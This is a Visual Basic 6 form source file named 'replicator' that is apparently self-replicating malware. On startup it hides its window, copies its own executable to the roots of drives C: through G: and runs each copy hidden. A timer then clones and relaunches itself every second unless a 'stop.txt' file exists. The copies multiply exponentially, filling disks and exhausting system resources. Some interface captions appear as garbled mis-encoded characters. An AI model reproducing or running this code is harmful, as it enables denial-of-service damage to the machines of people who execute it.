VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "replicator"
   ClientHeight    =   2835
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   3060
   Icon            =   "replicator.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   2835
   ScaleWidth      =   3060
   StartUpPosition =   3  '´°¿ÚÈ±Ê¡
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Text            =   "2"
      Top             =   1200
      Width           =   855
   End
   Begin VB.CommandButton Command1 
      Caption         =   "½áÊø"
      Height          =   615
      Left            =   1440
      TabIndex        =   0
      Top             =   120
      Width           =   1455
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   120
      Top             =   120
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub waittime(delay As Single)
Dim starttime As Single
starttime = Timer
Do Until (Timer - starttime) > delay
DoEvents
Loop
End Sub
Private Function nam(path As String) As String
Dim i As Integer
i = 0
While Dir(path & "\" & i & ".exe") <> "" And i <= 10000
i = i + 1
Wend
nam = i & ".exe"
End Function

Private Sub Command1_Click()
End
End Sub




Private Sub Form_Load()
Form1.Hide
On Error Resume Next
If Dir(App.path & "\" & "notallowed.txt") = "" Then
Dim a, b, c, d, e As String
a = nam("C:\")
b = nam("D:\")
c = nam("E:\")
d = nam("F:\")
e = nam("G:\")
FileCopy App.path & "\" & App.EXEName & ".exe", "C:\" & a
FileCopy App.path & "\" & App.EXEName & ".exe", "D:\" & b
FileCopy App.path & "\" & App.EXEName & ".exe", "E:\" & c
FileCopy App.path & "\" & App.EXEName & ".exe", "F:\" & d
FileCopy App.path & "\" & App.EXEName & ".exe", "G:\" & e
ret = Shell("C:\" & a, vbHide)
ret = Shell("D:\" & b, vbHide)
ret = Shell("E:\" & c, vbHide)
ret = Shell("F:\" & d, vbHide)
ret = Shell("G:\" & e, vbHide)

End If

End Sub

Private Sub Timer1_Timer()
On Error Resume Next
If Dir(App.path & "\" & "stop.txt") = "" Then

pname = nam(App.path)
FileCopy App.path & "\" & App.EXEName & ".exe", App.path & "\" & pname
waittime (1)
ret = Shell(App.path & "\" & pname, vbHide)
Else
Form1.Show
End If
End Sub
